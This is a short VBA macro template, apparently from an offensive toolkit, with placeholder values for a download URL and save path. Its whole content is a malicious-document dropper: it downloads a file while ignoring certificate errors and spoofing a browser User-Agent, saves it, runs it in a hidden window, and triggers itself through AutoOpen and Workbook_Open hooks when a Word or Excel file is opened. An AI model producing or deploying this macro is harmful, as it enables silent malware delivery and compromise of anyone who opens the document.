'Download and execute file
' will override any other file with same name
Private Sub DownloadAndExecute()
    Dim myURL As String
    Dim downloadPath As String
    Dim WinHttpReq As Object, oStream As Object
    Dim result As Integer
    
    myURL = "<<<TEMPLATE>>>"
    downloadPath = "<<<TEMPLATE>>>"
    
    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
    WinHttpReq.setOption(2) = 13056 ' Ignore cert errors
    WinHttpReq.Open "GET", myURL, False ', "username", "password"
    WinHttpReq.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
    WinHttpReq.Send
    
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.ResponseBody
        oStream.SaveToFile downloadPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
        oStream.Close
        CreateObject("WScript.Shell").Run downloadPath, 0
    End If    
    
End Sub


Sub AutoOpen()
    DownloadAndExecute
End Sub
Sub Workbook_Open()
    DownloadAndExecute
End Sub